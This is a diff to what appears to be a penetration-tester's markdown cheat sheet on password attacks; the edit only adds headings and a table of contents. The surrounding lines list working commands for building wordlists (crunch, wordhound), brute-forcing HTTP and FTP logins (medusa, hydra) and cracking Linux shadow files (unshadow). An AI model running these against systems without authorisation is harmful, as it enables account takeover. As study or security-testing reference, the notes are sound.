@@ -1,4 +1,11 @@
-Lists
+# Password Attacks
+
+- [Lists](#lists)
+- [Guessing](#guessing)
+- [Cracking](#cracking)
+
+
+## Lists
 
 Generate Password List
      cd /opt/wordhound && python Main.py wordhound
@@ -18,7 +25,7 @@ Wordlist using pre-defined character sets
 Wordlist with pattern such as abc$%#123
      crunch 8 8 -t ,@@^^%%% |more
 
-Guessing
+## Guessing
 
 Password Guessing
      medusa -h $ip -u admin -P password-file.txt -M http -m DIR:/admin -T 20 http
@@ -39,7 +46,7 @@ Guess an HTTP form with a field named "key"
      hydra -l admin -P password-file.txt -v $ip ftp ftp
      hydra -L users -P passwords -f -u $ip -s 21 ftp ftp
 
-Cracking
+## Cracking
 
 Crack Shadowfile
      unshadow passwd shadow > unshadow.txt
